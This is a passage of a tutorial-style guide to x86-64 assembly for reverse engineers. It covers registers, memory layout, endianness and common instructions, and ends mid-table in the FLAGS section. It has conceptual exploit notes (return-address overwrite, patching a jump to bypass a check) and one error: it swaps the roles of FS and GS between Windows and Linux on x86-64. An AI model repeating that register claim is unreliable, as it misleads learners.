# x86-64 Assembly — Complete Reverse Engineering Guide

> **Who is this for?** Students learning reverse engineering, malware analysis, exploit development, and binary auditing. Every concept is explained as if you're reading disassembly in IDA Pro, Ghidra, or GDB — not writing code from scratch.

---

## Table of Contents

1. [How a CPU Actually Executes Code](#1-how-a-cpu-actually-executes-code)
2. [Registers — Your Only Variables](#2-registers--your-only-variables)
3. [Memory Layout of a Process](#3-memory-layout-of-a-process)
4. [Data Sizes and Endianness](#4-data-sizes-and-endianness)
5. [Data Movement Instructions](#5-data-movement-instructions)
6. [Arithmetic Operations](#6-arithmetic-operations)
7. [Logical and Bitwise Operations](#7-logical-and-bitwise-operations)
8. [FLAGS Register Deep Dive](#8-flags-register-deep-dive)
9. [Comparison Instructions](#9-comparison-instructions)
10. [Jump Instructions — All Types](#10-jump-instructions--all-types)
11. [Loops — Every Pattern You'll See](#11-loops--every-pattern-youll-see)
12. [The Stack — How It Really Works](#12-the-stack--how-it-really-works)
13. [Functions and Calling Conventions](#13-functions-and-calling-conventions)
14. [Memory Addressing Modes](#14-memory-addressing-modes)
15. [String Instructions](#15-string-instructions)
16. [System Calls](#16-system-calls)
17. [Recognizing C Constructs in Assembly](#17-recognizing-c-constructs-in-assembly)
18. [Anti-Reverse-Engineering Tricks](#18-anti-reverse-engineering-tricks)
19. [Shellcode Basics](#19-shellcode-basics)
20. [GDB Cheat Sheet for RE](#20-gdb-cheat-sheet-for-re)
21. [Quick Reference Card](#21-quick-reference-card)

---

## 1. How a CPU Actually Executes Code

Before you read a single instruction, understand what happens inside the processor.

### The Fetch-Decode-Execute Cycle

Every CPU on earth does three things in a loop, billions of times per second:

```
1. FETCH   → Read the next instruction from memory (address in RIP register)
2. DECODE  → Figure out what the instruction means (opcode + operands)
3. EXECUTE → Do the operation (math, memory access, jump, etc.)
4. RIP advances to the next instruction (unless a jump changed it)
```

**Why this matters for RE:**
- When you set a breakpoint in GDB, you're telling the CPU to stop before the EXECUTE phase at that address.
- When you see `RIP = 0x401000` in a debugger, the CPU is about to execute the instruction at that address.
- A buffer overflow works by corrupting the value that will be loaded into RIP.

### Intel vs AT&T Syntax

You will encounter two syntaxes in the wild. **This guide uses Intel syntax** (used by IDA Pro, Ghidra, Windows debuggers).

| Feature | Intel Syntax | AT&T Syntax |
|---------|-------------|-------------|
| **Operand order** | `mov rax, rbx` (dest ← src) | `movq %rbx, %rax` (src → dest) |
| **Register prefix** | None: `rax` | Percent: `%rax` |
| **Immediate prefix** | None: `42` | Dollar: `$42` |
| **Memory access** | `[rax + rbx*4]` | `(%rax, %rbx, 4)` |
| **Size suffix** | `mov dword [rax], 5` | `movl $5, (%rax)` |
| **Used by** | IDA Pro, Ghidra, MASM, NASM | GCC output, GDB default, objdump |

> **RE Tip:** In GDB, switch to Intel syntax immediately:
> ```
> set disassembly-flavor intel
> ```
> Or add it to `~/.gdbinit` so it's always Intel.

### Machine Code ↔ Assembly

Assembly is **human-readable machine code**. Every instruction has a binary encoding:

```
Assembly:       mov rax, 0x42
Machine code:   48 C7 C0 42 00 00 00
                │  │  │  └─────────── immediate value 0x42 (little-endian)
                │  │  └────────────── ModRM byte (destination = RAX)
                │  └───────────────── opcode for "mov r64, imm32"
                └──────────────────── REX.W prefix (64-bit operand size)
```

**Why this matters for RE:**
- Malware authors write shellcode as raw bytes — you need to mentally decode this.
- Patching a binary means changing these exact bytes (e.g., changing `75` (JNZ) to `74` (JZ) to bypass a check).
- Instruction length varies from 1 to 15 bytes. This makes x86 a **variable-length** instruction set.

---

## 2. Registers — Your Only Variables

Registers are tiny, ultra-fast storage locations **inside the CPU**. There is no "RAM access" — registers are instant. When reversing, everything you see revolves around registers.

### The 16 General-Purpose Registers

x86-64 has 16 registers, each 64 bits (8 bytes) wide. You can access smaller portions of each:

```
 63                              31              15      7      0
 ┌───────────────────────────────┬───────────────┬───────┬──────┐
 │              RAX              │     EAX       │  AX   │AL/AH │
 └───────────────────────────────┴───────────────┴───────┴──────┘
```

| 64-bit | 32-bit | 16-bit | 8-bit High | 8-bit Low | Traditional Purpose |
|--------|--------|--------|------------|-----------|-------------------|
| `RAX` | `EAX` | `AX` | `AH` | `AL` | **Accumulator** — return values, multiplication/division |
| `RBX` | `EBX` | `BX` | `BH` | `BL` | **Base** — general purpose, callee-saved |
| `RCX` | `ECX` | `CX` | `CH` | `CL` | **Counter** — loop counts, shift amounts |
| `RDX` | `EDX` | `DX` | `DH` | `DL` | **Data** — I/O, mul/div overflow |
| `RSI` | `ESI` | `SI` | — | `SIL` | **Source Index** — string source pointer |
| `RDI` | `EDI` | `DI` | — | `DIL` | **Destination Index** — string dest pointer |
| `RBP` | `EBP` | `BP` | — | `BPL` | **Base Pointer** — stack frame base |
| `RSP` | `ESP` | `SP` | — | `SPL` | **Stack Pointer** — top of stack |
| `R8` | `R8D` | `R8W` | — | `R8B` | General purpose (new in x86-64) |
| `R9` | `R9D` | `R9W` | — | `R9B` | General purpose |
| `R10` | `R10D` | `R10W` | — | `R10B` | General purpose |
| `R11` | `R11D` | `R11W` | — | `R11B` | General purpose |
| `R12` | `R12D` | `R12W` | — | `R12B` | General purpose, callee-saved |
| `R13` | `R13D` | `R13W` | — | `R13B` | General purpose, callee-saved |
| `R14` | `R14D` | `R14W` | — | `R14B` | General purpose, callee-saved |
| `R15` | `R15D` | `R15W` | — | `R15B` | General purpose, callee-saved |

### ⚠️ Critical Rule: 32-bit Operations Zero the Upper 32 Bits

```asm
mov  rax, 0xFFFFFFFFFFFFFFFF   ; RAX = 0xFFFFFFFFFFFFFFFF
mov  eax, 0x1                  ; RAX = 0x0000000000000001 (upper 32 bits CLEARED!)
```

This is **not** the case for 8-bit or 16-bit operations:
```asm
mov  rax, 0xFFFFFFFFFFFFFFFF   ; RAX = 0xFFFFFFFFFFFFFFFF
mov  al,  0x1                  ; RAX = 0xFFFFFFFFFFFFFF01 (only AL changed!)
mov  ax,  0x1                  ; RAX = 0xFFFFFFFFFFFF0001 (only AX changed!)
```

> **RE Trap:** Compilers use `mov eax, 0` instead of `mov rax, 0` because the 32-bit version is shorter (no REX prefix) and auto-zeroes the upper half. When you see `mov eax, ...` in disassembly, the full `RAX` is being set.

### Special Registers You Can't Directly Access

| Register | What It Does | RE Relevance |
|----------|-------------|--------------|
| `RIP` | **Instruction Pointer** — address of the NEXT instruction to execute | You cannot `mov rip, rax`. Only jumps, calls, and returns change it. Controlling RIP = controlling execution = the goal of every exploit. |
| `RFLAGS` | **Flags Register** — stores results of comparisons/arithmetic | Determines which way conditional jumps go. Detailed in Section 8. |
| `CS, DS, SS, ES, FS, GS` | **Segment Registers** — memory segmentation | Mostly legacy. But `FS` (Windows) and `GS` (Linux) point to the Thread Information Block / Thread-Local Storage. Malware uses `FS:[0x30]` on Windows to find the PEB. |

### What Registers Mean When You're Reversing

When you open a binary in IDA/Ghidra and see a function, the registers tell you a story:

```asm
; At function entry (System V / Linux):
; RDI = 1st argument
; RSI = 2nd argument
; RDX = 3rd argument
; RCX = 4th argument
; R8  = 5th argument
; R9  = 6th argument
; Anything beyond 6 → on the stack

; At function exit:
; RAX = return value (always check this)
```

```asm
; At function entry (Windows x64):
; RCX = 1st argument
; RDX = 2nd argument
; R8  = 3rd argument
; R9  = 4th argument
; Anything beyond 4 → on the stack

; At function exit:
; RAX = return value
```

> **RE Tip:** When you see `test eax, eax` followed by `jz` after a `call`, the program is checking if the function returned 0 (failure) or non-zero (success). This is the most common pattern in all of RE.

---

## 3. Memory Layout of a Process

When a program runs, the OS gives it a virtual address space. Understanding this layout is **non-negotiable** for exploit development and malware analysis.

```
High Address (0x7FFFFFFFFFFF on Linux x86-64)
┌──────────────────────────────┐
│         KERNEL SPACE         │  ← You can't access this (ring 0 only)
├──────────────────────────────┤
│           STACK              │  ← Grows DOWNWARD (toward lower addresses)
│    Local variables, return   │    RSP points to the top
│    addresses, saved regs     │    RBP points to the frame base
│              ↓               │
│         (free space)         │
│              ↑               │
│            HEAP              │  ← Grows UPWARD (malloc, new)
├──────────────────────────────┤
│            .bss              │  ← Uninitialized global/static variables (zeroed)
├──────────────────────────────┤
│           .data              │  ← Initialized global/static variables
├──────────────────────────────┤
│          .rodata             │  ← Read-only data (string literals, constants)
├──────────────────────────────┤
│           .text              │  ← Executable code (your instructions live here)
├──────────────────────────────┤
│        Program Headers       │
└──────────────────────────────┘
Low Address (0x400000 typical on Linux)
```

### Each Section in Detail

| Section | Permission | What's In It | RE Relevance |
|---------|-----------|-------------|--------------|
| `.text` | **r-x** (read + execute) | Machine code instructions | This is what you disassemble. If writable → self-modifying code (packer/malware). |
| `.data` | **rw-** (read + write) | Initialized globals: `int x = 42;` | Global variables, encryption keys, config data. |
| `.rodata` | **r--** (read only) | String literals: `"Hello"` | Cross-reference strings in IDA to find interesting functions. |
| `.bss` | **rw-** (read + write) | Uninitialized globals: `int y;` | Large buffers, state variables. Takes no space in the binary file. |
| **Stack** | **rw-** (read + write) | Local variables, return addresses | **Buffer overflows** target the stack to overwrite return addresses. |
| **Heap** | **rw-** (read + write) | Dynamic allocations | **Heap overflows**, use-after-free, double-free exploits target this. |

### Stack Frame Layout (What You See in Every Function)

```
Higher addresses
┌──────────────────────────┐
│  Caller's stack frame    │
├──────────────────────────┤
│  Return address (8 bytes)│ ← Pushed by CALL instruction
├──────────────────────────┤ ← RBP points here (after push rbp; mov rbp,rsp)
│  Saved RBP (8 bytes)     │
├──────────────────────────┤
│  Local variable 1        │ ← [rbp - 8]
├──────────────────────────┤
│  Local variable 2        │ ← [rbp - 16]
├──────────────────────────┤
│  Local variable 3        │ ← [rbp - 24]
├──────────────────────────┤ ← RSP points here
│  (next push goes here)   │
└──────────────────────────┘
Lower addresses
```

> **RE Gold:** In a classic buffer overflow, you write past a local variable buffer (at `[rbp - X]`) upward through saved RBP, then overwrite the return address. When the function executes `ret`, it pops your controlled address into RIP.

### ASLR (Address Space Layout Randomization)

Modern systems randomize the base addresses of the stack, heap, and libraries on every execution. This means:
- You can't hardcode addresses in exploits.
- The `.text` section of PIE (Position Independent Executables) is also randomized.
- You need an **info leak** to defeat ASLR.

> **RE Tip:** In GDB, ASLR is disabled by default. To test with ASLR on: `set disable-randomization off`

---

## 4. Data Sizes and Endianness

### Size Names — Memorize These

| Name | Size | Bits | C Equivalent | ASM Directive | Example |
|------|------|------|-------------|--------------|---------|
| **Byte** | 1 byte | 8 | `char` | `db` (define byte) | `0xFF` |
| **Word** | 2 bytes | 16 | `short` | `dw` (define word) | `0xFFFF` |
| **Doubleword (DWORD)** | 4 bytes | 32 | `int` | `dd` (define dword) | `0xFFFFFFFF` |
| **Quadword (QWORD)** | 8 bytes | 64 | `long`, pointer | `dq` (define qword) | `0xFFFFFFFFFFFFFFFF` |

> **Why "word" = 16 bits?** Historical. On the original 8086, the native register size was 16 bits = 1 "word." When x86 expanded to 32 and 64 bits, the term "word" stayed at 16 bits. This confuses everyone.

### Little-Endian — x86 Stores Bytes Backwards

x86/x86-64 is **little-endian**: the **least significant byte** is stored at the **lowest address**.

```
The value 0x12345678 stored at address 0x1000:

Address:  0x1000  0x1001  0x1002  0x1003
Value:    0x78    0x56    0x34    0x12
          └─ LSB (least significant)      └─ MSB (most significant)
```

**Visual example:**
```
mov dword [rax], 0xDEADBEEF

Memory dump at [rax]:
EF BE AD DE
│  │  │  │
│  │  │  └── 0xDE (most significant byte, highest address)
│  │  └───── 0xAD
│  └──────── 0xBE
└─────────── 0xEF (least significant byte, lowest address)
```

### Why This Matters for RE

1. **Reading hex dumps:** When you see `EF BE AD DE` in a memory dump, the actual value is `0xDEADBEEF`.

2. **Strings are NOT reversed** (strings are just byte arrays stored in order):
   ```
   "ABCD" in memory: 41 42 43 44  (just left to right, ASCII codes)
   ```

3. **Network data is big-endian** — when malware sends data over the network, it often calls `htonl()` / `htons()` to convert endianness.

4. **Shellcode addresses:** If you want to jump to `0x7FFFF7A42000`, you write it as:
   ```
   \x00\x20\xa4\xf7\xff\x7f\x00\x00
   ```

### Signed vs Unsigned Representation

The CPU doesn't "know" if a number is signed or unsigned. The **same bits** mean different things depending on which instruction you use:

```
Bit pattern: 0xFFFFFFFF (32-bit)
As unsigned: 4,294,967,295
As signed:   -1   (two's complement)

Bit pattern: 0x80000000 (32-bit)
As unsigned: 2,147,483,648
As signed:   -2,147,483,648  (minimum 32-bit signed int)
```

**Two's complement** (how negative numbers work):
```
To negate a number:
1. Flip all bits (NOT)
2. Add 1

Example:  5 = 0000 0101
NOT:          1111 1010
+1:           1111 1011 = -5 = 0xFB
```

> **RE Trap:** `JA` (jump if above) treats values as unsigned. `JG` (jump if greater) treats them as signed. The same `cmp` followed by the wrong jump type will produce completely different behavior. Malware sometimes exploits this confusion.

---

## 5. Data Movement Instructions

These are the most frequently seen instructions in any disassembly. ~40% of all instructions in a typical binary are `mov`.

### MOV — The Most Important Instruction

```asm
mov  destination, source     ; destination = source  (source is UNCHANGED)
```

`MOV` copies data. It does **NOT** modify any flags.

```asm
; Register ← Immediate (constant)
mov  rax, 42                ; RAX = 42
mov  eax, 0                 ; RAX = 0 (remember: 32-bit clears upper 32)
mov  al, 0xFF               ; AL = 0xFF (only lowest byte changes)

; Register ← Register
mov  rbx, rax               ; RBX = RAX (RAX unchanged)

; Register ← Memory
mov  rax, [rbx]             ; RAX = 8 bytes at address stored in RBX
                             ; The [] means "go to that address and read"
                             ; Think of it as: RAX = *rbx  (C pointer dereference)

; Memory ← Register
mov  [rbx], rax             ; Store RAX at the address in RBX
                             ; Think: *rbx = RAX

; Memory ← Immediate
mov  dword [rbx], 0         ; Store 0 (4 bytes) at address in RBX
                             ; Must specify size (byte/word/dword/qword)
                             ; because the assembler can't guess from "0"
```

### ❌ What MOV Cannot Do

```asm
mov  [rax], [rbx]           ; ILLEGAL! Cannot move memory to memory
                             ; You must go through a register:
                             ;   mov rcx, [rbx]
                             ;   mov [rax], rcx
```

> **RE Pattern:** When you see two `mov` instructions like this in disassembly, the compiler is copying one memory location to another.

### LEA — Load Effective Address (NOT a Memory Load!)

```asm
lea  destination, [expression]   ; destination = address of expression
                                  ; Does NOT read memory!
                                  ; Does NOT modify flags!
```

**LEA vs MOV — The #1 Confusion in RE:**

```asm
lea  rax, [rbx]             ; RAX = RBX          (copies the ADDRESS)
mov  rax, [rbx]             ; RAX = *(RBX)       (reads VALUE at that address)

; Concrete example:
; Suppose RBX = 0x601000 and memory at 0x601000 contains 0xDEADBEEF

lea  rax, [rbx]             ; RAX = 0x601000     (the address itself)
mov  rax, [rbx]             ; RAX = 0xDEADBEEF   (what's AT the address)
```

**Why LEA exists — it's a math shortcut:**
```asm
; The CPU can do this in ONE instruction:
lea  rax, [rbx + rcx*4 + 16]    ; RAX = RBX + (RCX × 4) + 16
                                  ; No memory access! Just arithmetic.
                                  ; Does NOT touch flags.

; Without LEA you'd need:
mov  rax, rcx                    ; RAX = RCX
shl  rax, 2                     ; RAX = RCX * 4    (modifies flags!)
add  rax, rbx                   ; RAX = RCX*4+RBX  (modifies flags!)
add  rax, 16                    ; RAX = RCX*4+RBX+16 (modifies flags!)
```

> **RE Pattern:** Compilers LOVE using LEA for:
> 1. Computing array addresses: `lea rax, [rdi + rsi*4]` → `&array[i]`
> 2. Quick multiplication: `lea rax, [rdi + rdi*2]` → `rdi * 3`
> 3. Addition without affecting flags: `lea rax, [rdi + 1]` → `rdi + 1` (preserves flags from a previous `cmp`)

### MOVZX — Move with Zero Extension

Loads a smaller value into a larger register, filling upper bits with **zeros**. Used for **unsigned** values.

```asm
movzx  eax, byte [rbx]      ; Read 1 byte, zero-extend to 32 bits
                              ; If byte = 0xFF:
                              ; EAX = 0x000000FF
                              ; RAX = 0x00000000000000FF (32-bit op clears upper)

movzx  eax, word [rbx]      ; Read 2 bytes, zero-extend to 32 bits

; In C, this is what happens when you do:
; unsigned char c = buffer[i];
; unsigned int x = c;          ← compiler generates MOVZX
```

### MOVSX / MOVSXD — Move with Sign Extension

Loads a smaller value into a larger register, filling upper bits with the **sign bit**. Used for **signed** values.

```asm
movsx  eax, byte [rbx]      ; Read 1 byte, sign-extend to 32 bits
                              ; If byte = 0xFF (-1 as signed byte):
                              ; EAX = 0xFFFFFFFF (-1 as signed int)

movsx  rax, byte [rbx]      ; Sign-extend byte to 64 bits
movsxd rax, dword [rbx]     ; Sign-extend 32-bit to 64-bit (special mnemonic)

; In C:
; signed char c = -5;
; int x = c;                  ← compiler generates MOVSX
```

> **RE Critical:** The difference between `MOVZX` and `MOVSX` tells you whether the compiler thinks a variable is `signed` or `unsigned`. This helps you reconstruct data types during reversing.

### XCHG — Exchange (Swap)

```asm
xchg  rax, rbx              ; Swap RAX and RBX
                              ; temp = RAX; RAX = RBX; RBX = temp
```

> **RE Warning:** `xchg [mem], reg` has an implicit `LOCK` prefix, making it atomic. This is used in spinlocks and thread synchronization. Extremely slow compared to register `xchg`.

### CMOVcc — Conditional Move (Branchless Code)

```asm
cmp   rax, rbx              ; Compare RAX and RBX
cmovl rax, rcx              ; If RAX < RBX (signed), then RAX = RCX
                              ; Otherwise RAX is unchanged
                              ; NO branch, NO jump — just a conditional copy
```

All condition codes work (same as jumps): `cmove`, `cmovne`, `cmovg`, `cmovl`, `cmova`, `cmovb`, etc.

> **RE Pattern:** Compilers use CMOV to avoid branch misprediction penalties. When you see `cmov` in disassembly, it's a ternary: `rax = (condition) ? rcx : rax`
>
> ```c
> // This C code:
> x = (a < b) ? c : x;
> // Compiles to:
> // cmp  rdi, rsi
> // cmovl rax, rdx
> ```

### PUSH and POP (Preview — Detailed in Stack Section)

```asm
push  rax                    ; RSP -= 8; [RSP] = RAX  (store and decrement)
pop   rbx                   ; RBX = [RSP]; RSP += 8  (load and increment)
```

---

## 6. Arithmetic Operations

Every arithmetic instruction modifies the **FLAGS register** (except where noted). This is crucial because conditional jumps read those flags.

### ADD — Addition

```asm
add  rax, rbx               ; RAX = RAX + RBX
add  rax, 10                ; RAX = RAX + 10
add  [rbx], rax             ; memory[RBX] = memory[RBX] + RAX
add  dword [rbx], 1         ; memory[RBX] += 1 (4-byte addition)
```

**Flags affected:** CF (unsigned overflow), OF (signed overflow), ZF, SF, PF, AF

```
Example that sets CF:
  mov  al, 0xFF             ; AL = 255 (max unsigned byte)
  add  al, 1                ; AL = 0, CF = 1 (wrapped around!)
                             ; This is unsigned overflow

Example that sets OF:
  mov  al, 0x7F             ; AL = 127 (max signed byte)
  add  al, 1                ; AL = 0x80 = -128, OF = 1 (signed overflow!)
                             ; Went from positive max to negative min
```

### SUB — Subtraction

```asm
sub  rax, rbx               ; RAX = RAX - RBX
sub  rax, 10                ; RAX = RAX - 10
```

**Flags affected:** Same as ADD. CF is set if a borrow occurred (unsigned underflow).

> **RE Insight:** `sub rsp, 0x20` at the start of a function = allocating 32 bytes of local variable space on the stack. The size tells you how many local variables the function has.

### INC / DEC — Increment / Decrement by 1

```asm
inc  rax                    ; RAX = RAX + 1
dec  rax                    ; RAX = RAX - 1
inc  dword [rbx]            ; memory[RBX] += 1
dec  byte [rbx]             ; memory[RBX] -= 1
```

**Flags affected:** ZF, SF, OF, PF, AF — but **NOT CF!**

> **RE Note:** Because INC/DEC don't touch CF, they can be used in loops where CF carries info from another operation. Compilers sometimes use `add rax, 1` instead of `inc rax` for this reason.

### NEG — Negate (Two's Complement)

```asm
neg  rax                    ; RAX = -RAX  (flip sign)
                             ; Internally: RAX = 0 - RAX
                             ; Sets CF unless result is 0
```

```
 neg on  5 (0x00000005) → -5 (0xFFFFFFFB)
 neg on -5 (0xFFFFFFFB) →  5 (0x00000005)
 neg on  0 (0x00000000) →  0 (CF = 0, ZF = 1)
```

### MUL — Unsigned Multiplication

```asm
; MUL always multiplies RAX by the operand
; Result is TWICE the width, stored in RDX:RAX

mul  rbx                    ; RDX:RAX = RAX * RBX (unsigned, 128-bit result)
                             ; RAX = lower 64 bits of result
                             ; RDX = upper 64 bits of result (overflow)
```

**Different sizes:**
```asm
mul  bl                     ; AX = AL * BL                 (8×8 → 16)
mul  bx                     ; DX:AX = AX * BX              (16×16 → 32)
mul  ebx                    ; EDX:EAX = EAX * EBX           (32×32 → 64)
mul  rbx                    ; RDX:RAX = RAX * RBX           (64×64 → 128)
```

### IMUL — Signed Multiplication (3 Forms!)

```asm
; Form 1: One operand (same as MUL but signed)
imul rbx                    ; RDX:RAX = RAX * RBX (signed)

; Form 2: Two operands (most common in compiler output)
imul rax, rbx               ; RAX = RAX * RBX
                             ; Overflow is LOST (no RDX)
                             ; OF/CF set if result overflowed

; Form 3: Three operands (multiply with immediate)
imul rax, rbx, 12           ; RAX = RBX * 12
                             ; Most flexible form
```

> **RE Pattern:** Compilers almost always use the 2-operand or 3-operand form. If you see `imul rax, rcx, 0x38` — that's computing an offset into a struct array (each struct is 0x38 = 56 bytes).

**Compiler tricks to avoid slow MUL/IMUL:**
```asm
; x * 2   →  shl rax, 1       (or add rax, rax)
; x * 3   →  lea rax, [rax + rax*2]
; x * 4   →  shl rax, 2
; x * 5   →  lea rax, [rax + rax*4]
; x * 10  →  lea rax, [rax + rax*4] ; rax = x*5
;             shl rax, 1              ; rax = x*10
```

### DIV — Unsigned Division

```asm
; CRITICAL: You MUST set up RDX:RAX before calling DIV

xor  rdx, rdx               ; RDX = 0 (clear upper 64 bits!)
mov  rax, 100               ; RAX = 100 (dividend)
mov  rcx, 7                 ; RCX = 7 (divisor)
div  rcx                    ; RAX = 100 / 7 = 14 (quotient)
                             ; RDX = 100 % 7 = 2  (remainder)
```

> **RE Danger:** If you forget to zero RDX before DIV, the value in RDX becomes part of the dividend and you get wrong results or a **division exception** (#DE) which crashes the program.

### IDIV — Signed Division

```asm
mov  rax, -100               ; RAX = -100 (signed dividend)
cqo                          ; Sign-extend RAX into RDX:RAX
                              ; CQO = "Convert Quadword to Octword"
                              ; If RAX is negative, RDX = 0xFFFFFFFFFFFFFFFF
                              ; If RAX is positive, RDX = 0x0000000000000000
mov  rcx, 7
idiv rcx                     ; RAX = -14 (quotient, signed)
                              ; RDX = -2  (remainder, signed)
```

**Sign extension instructions (used before IDIV):**
```asm
cbw                          ; Sign-extend AL → AX            (byte → word)
cwd                          ; Sign-extend AX → DX:AX         (word → dword)
cdq                          ; Sign-extend EAX → EDX:EAX      (dword → qword)
cqo                          ; Sign-extend RAX → RDX:RAX      (qword → octword)
```

> **RE Pattern:** When you see `cdq` or `cqo` followed by `idiv`, it's a signed division. When you see `xor edx, edx` followed by `div`, it's unsigned division. This tells you the data types.

### ADC / SBB — Multi-Precision Arithmetic

```asm
; Adding two 128-bit numbers stored in [R8:RAX] and [R9:RBX]:
add  rax, rbx               ; Add lower 64 bits
adc  r8, r9                 ; Add upper 64 bits + carry from lower add
                             ; ADC = ADD + Carry Flag

; Subtracting:
sub  rax, rbx               ; Subtract lower 64 bits
sbb  r8, r9                 ; Subtract upper 64 bits - borrow from lower sub
                             ; SBB = SUB - Carry Flag (borrow)
```

---

## 7. Logical and Bitwise Operations

These are the backbone of encryption, hashing, obfuscation, and flag checking. If you're reversing malware or crypto, this section is critical.

### AND — Bitwise AND

```asm
and  rax, rbx               ; RAX = RAX & RBX
                              ; Each bit: 1 AND 1 = 1, everything else = 0
```

**Common uses in real binaries:**

```asm
; 1. MASKING — extract specific bits
and  eax, 0xFF              ; Keep only lowest byte (clear upper 24 bits)
                              ; C equivalent: eax = eax & 0xFF
                              ; Same as: eax = (unsigned char)eax

; 2. ALIGNMENT — align address to boundary
and  rsp, -16               ; Align stack to 16-byte boundary
                              ; -16 = 0xFFFFFFFFFFFFFFF0
                              ; Clears the lowest 4 bits
                              ; You'll see this in EVERY function that calls SSE

; 3. CHECK PERMISSIONS — test bit flags
and  eax, 0x04              ; Isolate bit 2 (read permission in Unix)
```

### OR — Bitwise OR

```asm
or   rax, rbx               ; RAX = RAX | RBX
                              ; Each bit: 0 OR 0 = 0, everything else = 1
```

**Common uses:**
```asm
; 1. SET BITS — turn on specific flags
or   eax, 0x01              ; Set bit 0 (make number odd)
or   eax, 0x200             ; Set bit 9

; 2. COMBINE FLAGS
or   eax, ecx               ; Merge two sets of flags

; 3. CHECK FOR ZERO (obscure but seen in optimized code)
or   rax, rax               ; Sets ZF if RAX == 0 (same as test rax, rax)
```

### XOR — Bitwise Exclusive OR

```asm
xor  rax, rbx               ; RAX = RAX ^ RBX
                              ; Each bit: same = 0, different = 1
```

**XOR is the most important bitwise op for RE:**

```asm
; 1. ZEROING A REGISTER (you'll see this thousands of times)
xor  eax, eax               ; EAX = 0
                              ; Shorter than "mov eax, 0" (2 bytes vs 5)
                              ; Compilers ALWAYS use this
                              ; When you see it → variable/return initialized to 0

; 2. ENCRYPTION / DECRYPTION (XOR cipher)
;    XOR is its own inverse: A ^ B ^ B = A
xor  al, 0x55               ; Encrypt byte with key 0x55
xor  al, 0x55               ; Decrypt: applying same key restores original
                              ; Malware LOVES single-byte XOR encryption

; 3. SWAP WITHOUT TEMP (rare but seen in CTFs)
xor  rax, rbx               ; RAX = A ^ B
xor  rbx, rax               ; RBX = B ^ (A ^ B) = A
xor  rax, rbx               ; RAX = (A ^ B) ^ A = B

; 4. CHECK IF TWO VALUES ARE EQUAL
xor  eax, ebx               ; If equal: result = 0, ZF = 1
```

> **RE Gold:** When reversing malware, look for XOR loops. Pattern: `load byte → XOR with key → store byte → increment pointer → loop`. This is the most common string/payload decryption method in malware.

### NOT — Bitwise NOT (One's Complement)

```asm
not  rax                     ; Flip every bit in RAX
                              ; RAX = ~RAX
                              ; 0 → 1, 1 → 0 for each bit
                              ; Does NOT modify any flags!
```

```
 not  0x00000000 = 0xFFFFFFFF
 not  0xFFFFFFFF = 0x00000000
 not  0xAAAAAAAA = 0x55555555
```

> **RE Note:** `NOT` + `ADD 1` = `NEG` (two's complement negation). So `not rax; add rax, 1` is the same as `neg rax`.

### TEST — Bitwise AND Without Storing Result

```asm
test rax, rbx                ; Compute RAX & RBX, set flags, DISCARD result
                              ; RAX is unchanged, RBX is unchanged
                              ; Only the FLAGS are updated
                              ; Always clears CF and OF
```

**This is one of the MOST common instructions in all disassembly:**

```asm
; Pattern 1: Check if a value is zero
test eax, eax               ; Is EAX zero?
jz   somewhere               ; Jump if EAX == 0  (ZF = 1)
jnz  elsewhere               ; Jump if EAX != 0  (ZF = 0)
; WHY not "cmp eax, 0"? TEST is shorter (2 bytes vs 3) and faster

; Pattern 2: Check if a specific bit is set
test eax, 0x01               ; Is bit 0 set? (is EAX odd?)
jnz  bit_is_set              ; Jump if bit 0 = 1

test eax, 0x80               ; Is bit 7 set? (is highest bit of byte set?)
jnz  high_bit_set

; Pattern 3: After a function call — check return value
call some_function
test eax, eax               ; Did function return 0?
jz   function_failed         ; If 0 → failure (common convention)
; This is THE most common pattern you'll see in all of reverse engineering
```

### Shift Operations

```asm
; SHL — Shift Left Logical
; Fills with 0 on the right. Last shifted-out bit → CF.
shl  rax, 1                 ; RAX = RAX * 2
shl  rax, 4                 ; RAX = RAX * 16 (2^4)
shl  rax, cl                ; Shift by amount in CL register

; SHR — Shift Right Logical (unsigned division by 2^n)
; Fills with 0 on the left. Last shifted-out bit → CF.
shr  rax, 1                 ; RAX = RAX / 2 (unsigned)
shr  rax, 3                 ; RAX = RAX / 8 (unsigned)

; SAR — Shift Right Arithmetic (signed division by 2^n)
; Fills with the SIGN BIT on the left. Preserves negative numbers.
sar  rax, 1                 ; RAX = RAX / 2 (signed, rounds toward -∞)

; SAL — Shift Arithmetic Left (IDENTICAL to SHL)
; These are literally the same instruction with different names
```

**SHR vs SAR — The Critical Difference:**
```asm
mov  eax, 0x80000000         ; -2147483648 (signed) or 2147483648 (unsigned)

shr  eax, 1                  ; EAX = 0x40000000 = 1073741824
                              ; Treats as unsigned: divided by 2 correctly

mov  eax, 0x80000000
sar  eax, 1                  ; EAX = 0xC0000000 = -1073741824
                              ; Preserves sign bit: divided by 2 correctly (signed)
```

> **RE Insight:** When you see `SHR` → unsigned division by power of 2. When you see `SAR` → signed division by power of 2. This reveals the variable's type.

### Rotate Operations

```asm
; ROL — Rotate Left (bits wrap around)
rol  rax, 1                 ; Shift left, MSB wraps to LSB and CF
                              ; Like SHL but no bits are lost

; ROR — Rotate Right (bits wrap around)
ror  rax, 1                 ; Shift right, LSB wraps to MSB and CF

; RCL / RCR — Rotate through Carry
rcl  rax, 1                 ; Rotate left through CF (CF becomes part of rotation)
rcr  rax, 1                 ; Rotate right through CF
```

> **RE Pattern:** Rotates are uncommon in normal compiler output. If you see them, it's likely:
> 1. Hand-written crypto (MD5, SHA use rotates heavily)
> 2. Obfuscated/packed malware
> 3. Hash functions

### BT, BTS, BTR, BTC — Bit Test Operations

```asm
bt   rax, 5                 ; Copy bit 5 of RAX into CF
                              ; RAX unchanged. Check CF to see the bit.
jc   bit_was_set             ; Jump if bit 5 was 1

bts  rax, 5                 ; Test bit 5 (→ CF), then SET it to 1
btr  rax, 5                 ; Test bit 5 (→ CF), then RESET it to 0
btc  rax, 5                 ; Test bit 5 (→ CF), then COMPLEMENT (toggle) it
```

### BSF / BSR — Bit Scan

```asm
bsf  rax, rbx               ; Find first set bit (from bit 0 upward)
                              ; RAX = index of lowest set bit in RBX
                              ; ZF = 1 if RBX = 0

bsr  rax, rbx               ; Find first set bit (from MSB downward)
                              ; RAX = index of highest set bit in RBX
```

> **RE Context:** These are used in memory allocators, bitmap data structures, and scheduling algorithms.

---

## 8. FLAGS Register Deep Dive

The FLAGS register is a 64-bit register where individual **bits** have meaning. After most arithmetic/logical instructions, specific flag bits are updated. Conditional jumps then READ these flags.

```
Bit   Name   Full Name              When Set (= 1)
───── ────── ────────────────────── ────────────────────────────────────────
 0    CF     Carry Flag             Unsigned overflow/underflow occurred
